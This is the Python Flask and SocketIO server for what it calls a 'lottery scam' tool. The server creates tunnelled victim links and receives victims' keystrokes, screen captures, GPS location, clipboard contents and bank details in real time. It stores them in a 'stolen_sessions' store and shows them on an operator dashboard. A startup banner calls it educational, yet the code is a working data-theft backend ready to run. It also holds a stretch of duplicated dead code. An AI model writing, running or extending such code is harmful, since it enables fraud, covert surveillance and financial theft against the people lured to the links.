
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
import os
import base64
from datetime import datetime
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'lottery-scam-super-secret-2024'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store all stolen data
stolen_sessions = {}

# Store ngrok URL (will be set from dashboard)
ngrok_url = None

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/set-ngrok', methods=['POST'])
def set_ngrok():
    global ngrok_url
    data = request.json
    ngrok_url = data.get('ngrok_url')
    print(f'🌐 ngrok URL set to: {ngrok_url}')
    return jsonify({'status': 'success', 'ngrok_url': ngrok_url})

@app.route('/create')
@app.route('/create')
def create_session():
    global ngrok_url
    session_id = f"lottery_{int(os.urandom(4).hex(), 16)}"
    stolen_sessions[session_id] = {
        'keys': [],
        'gps': None,
        'clipboard': [],
        'screen_frames': [],
        'bank_details': None,
        'start_time': datetime.now().isoformat(),
        'last_activity': datetime.now().isoformat()
    }
    
    # Use the saved tunnel URL (Cloudflare or ngrok)
    if ngrok_url:
        # Clean the URL - remove trailing slash if exists
        base_url = ngrok_url.rstrip('/')
        link = f"{base_url}/viewer/{session_id}"
    else:
        link = f"http://localhost:5000/viewer/{session_id}"
    
    return jsonify({
        'session_id': session_id,
        'link': link,
        'tunnel_used': bool(ngrok_url)
    })
    # Use ngrok URL if set, otherwise localhost
    if ngrok_url:
        link = f"{ngrok_url}/viewer/{session_id}"
    else:
        link = f"http://localhost:5000/viewer/{session_id}"
    
    return jsonify({
        'session_id': session_id,
        'link': link,
        'ngrok_used': bool(ngrok_url)
    })

@app.route('/viewer/<session_id>')
def viewer(session_id):
    # Auto-create session if it doesn't exist
    if session_id not in stolen_sessions:
        stolen_sessions[session_id] = {
            'keys': [],
            'gps': None,
            'clipboard': [],
            'screen_frames': [],
            'bank_details': None,
            'start_time': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat()
        }
        print(f'🆕 Auto-created session from viewer: {session_id}')
    return render_template('viewer.html', session_id=session_id)

@app.route('/get-session-data/<session_id>')
def get_session_data(session_id):
    """API endpoint to get all collected data for a session"""
    if session_id in stolen_sessions:
        return jsonify(stolen_sessions[session_id])
    return jsonify({'error': 'Session not found'}), 404

@app.route('/get-all-sessions')
def get_all_sessions():
    """API endpoint to get all sessions data"""
    return jsonify(stolen_sessions)

@socketio.on('connect')
def handle_connect():
    print('🎮 New client connected!')

@socketio.on('join_session')
def handle_join(data):
    session_id = data['session_id']
    # Ensure session exists
    if session_id not in stolen_sessions:
        stolen_sessions[session_id] = {
            'keys': [],
            'gps': None,
            'clipboard': [],
            'screen_frames': [],
            'bank_details': None,
            'start_time': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat()
        }
        print(f'🆕 Auto-created session from join: {session_id}')
    
    stolen_sessions[session_id]['last_activity'] = datetime.now().isoformat()
    print(f'🎯 Victim {session_id} joined scam')
    emit('session_joined', {'status': 'success', 'session_id': session_id})

@socketio.on('screen_frame')
def handle_screen(data):
    session_id = data['session_id']
    if session_id in stolen_sessions:
        # Store frame (limit to last 50 frames to save memory)
        frame_data = {
            'frame': data['frame'][:500] + '...' if len(data['frame']) > 500 else data['frame'],  # Truncate for display
            'width': data['width'],
            'height': data['height'],
            'timestamp': datetime.now().isoformat()
        }
        stolen_sessions[session_id]['screen_frames'].append(frame_data)
        # Keep only last 50 frames
        if len(stolen_sessions[session_id]['screen_frames']) > 50:
            stolen_sessions[session_id]['screen_frames'] = stolen_sessions[session_id]['screen_frames'][-50:]
        
        emit('new_screen', data, room='dashboard_' + session_id)
        print(f'🖥️ Screen frame received from {session_id}')
    else:
        print(f'⚠️ Session {session_id} not found for screen frame')

@socketio.on('keystroke')
def handle_keystroke(data):
    session_id = data['session_id']
    if session_id in stolen_sessions:
        key_entry = {
            'key': data['key'],
            'code': data.get('code', ''),
            'time': data.get('timestamp', datetime.now().timestamp()),
            'datetime': datetime.now().isoformat()
        }
        stolen_sessions[session_id]['keys'].append(key_entry)
        stolen_sessions[session_id]['last_activity'] = datetime.now().isoformat()
        emit('new_key', data, room='dashboard_' + session_id)
        
        # Only print non-bank details keys to avoid spam
        key_display = data['key'][:50] if len(data['key']) > 50 else data['key']
        if 'BANK DETAILS' not in key_display:
            print(f'⌨️ [{session_id}] {key_display}')
    else:
        print(f'⚠️ Session {session_id} not found for keystroke')

@socketio.on('gps_data')
def handle_gps(data):
    session_id = data['session_id']
    if session_id in stolen_sessions:
        stolen_sessions[session_id]['gps'] = {
            'lat': data['lat'],
            'lon': data['lon'],
            'accuracy': data.get('accuracy', 0),
            'timestamp': datetime.now().isoformat()
        }
        stolen_sessions[session_id]['last_activity'] = datetime.now().isoformat()
        emit('new_gps', data, room='dashboard_' + session_id)
        print(f'📍 GPS [{session_id}]: {data["lat"]:.4f}, {data["lon"]:.4f}')
    else:
        print(f'⚠️ Session {session_id} not found for GPS')

@socketio.on('clipboard_data')
def handle_clipboard(data):
    session_id = data['session_id']
    if session_id in stolen_sessions:
        clipboard_entry = {
            'text': data['text'],
            'timestamp': datetime.now().isoformat()
        }
        stolen_sessions[session_id]['clipboard'].append(clipboard_entry)
        stolen_sessions[session_id]['last_activity'] = datetime.now().isoformat()
        emit('new_clipboard', data, room='dashboard_' + session_id)
        
        # Special handling for bank details
        if 'BANK DETAILS' in data['text'] or '🏦' in data['text']:
            stolen_sessions[session_id]['bank_details'] = data['text']
            print(f'💰💰💰 BANK DETAILS RECEIVED from {session_id}')
            print(f'📋 Full Bank Details: {data["text"]}')
        else:
            print(f'📋 CLIPBOARD [{session_id}]: {data["text"][:50]}...')
    else:
        print(f'⚠️ Session {session_id} not found for clipboard - creating now')
        stolen_sessions[session_id] = {
            'keys': [],
            'gps': None,
            'clipboard': [],
            'screen_frames': [],
            'bank_details': None,
            'start_time': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat()
        }
        stolen_sessions[session_id]['clipboard'].append({'text': data['text'], 'timestamp': datetime.now().isoformat()})
        emit('new_clipboard', data, room='dashboard_' + session_id)

@socketio.on('register_dashboard')
def register_dashboard(data):
    session_id = data['session_id']
    join_room('dashboard_' + session_id)
    if session_id in stolen_sessions:
        emit('session_data', stolen_sessions.get(session_id, {}), room='dashboard_' + session_id)
        print(f'📊 Dashboard registered for session: {session_id}')
    else:
        print(f'⚠️ Dashboard registered for non-existent session: {session_id}')
        stolen_sessions[session_id] = {
            'keys': [],
            'gps': None,
            'clipboard': [],
            'screen_frames': [],
            'bank_details': None,
            'start_time': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat()
        }
        

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔒 LOTTERY SCAM DEMO - EDUCATIONAL PURPOSE")
    print("="*60)
    print("\n⚠️ IMPORTANT DISCLAIMER:")
    print("This tool is for EDUCATIONAL PURPOSES only.")
    print("Always obtain informed consent before monitoring.\n")
    print("📡 Starting server on http://localhost:5000")
    print("🌐 For external access, run: ngrok http 5000")
    print("="*60 + "\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)